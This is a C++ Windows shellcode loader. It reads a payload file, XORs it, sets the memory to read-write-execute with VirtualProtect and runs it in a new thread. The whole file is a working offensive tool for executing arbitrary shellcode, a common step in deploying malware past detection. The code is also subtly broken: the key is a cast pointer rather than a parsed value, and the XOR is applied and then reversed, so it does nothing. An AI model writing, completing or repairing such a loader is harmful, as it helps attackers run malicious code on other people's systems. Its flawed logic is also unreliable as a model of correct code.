#include <iostream>
#include <string>
#include <fstream>
#include <vector>
#include <WinError.h>
#include <Windows.h>

using namespace std;

// XOR the data from a given file.
void XOREncoding(vector <BYTE>& data, const BYTE key)
{
	for (auto& byte: data)
	{
        byte ^= key;
	}
}

vector<BYTE> ReadBinaryFile(const string& filename) {
    ifstream file(filename,  ios::binary);
    if (!file) {
        const auto& err = errno;

        char error_message[256];  

        strerror_s(error_message, sizeof(error_message), err);

        cerr << "Could not open file: " << filename << ". Error: " << error_message << endl;
        return {};  // Return an empty vector
    }

    // Read file's content
    vector<BYTE> data((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
    file.close();
    return data;
}

void decodeXOR(LPVOID address, size_t numBytes, uint8_t key) {
    uint8_t* bytePtr = static_cast<uint8_t*>(address);  // Convertir el puntero genérico a puntero de uint8_t

    for (size_t i = 0; i < numBytes; ++i) {
        bytePtr[i] ^= key;  // Aplicar XOR a cada byte con la clave
    }
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        cout << "Usage: " << argv[0] << " [key] [file]\n";
        return 1;
    }

    // Get the XOR encription key from command line
    BYTE key = reinterpret_cast<BYTE>(argv[1]);
    string filename = argv[2];

    // Read the file
    vector<BYTE> fileData = ReadBinaryFile(filename);

    if (fileData.empty()) {
        return 2;  
    }

    LPVOID ptr = &fileData[0];
    printf("%-20s : 0x%-016p\n", "exec_mem addr", (void*)ptr);

    XOREncoding(fileData, key);

    // Set memory to RWX
    DWORD oldProtect = 0;
    BOOL exec_mem = VirtualProtect(
        ptr,
        fileData.size(),
        PAGE_EXECUTE_READWRITE,
        &oldProtect);

    decodeXOR(ptr, fileData.size(), key);

    // Execute it
    DWORD threadId = 0;
    HANDLE hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)ptr,
        NULL,
        0,
        &threadId);

    // close handle
    CloseHandle(hThread);

    // stop the program from closing
    std::cout << "Shellcode is running, press key to exit" << std::endl;
    getchar();

}
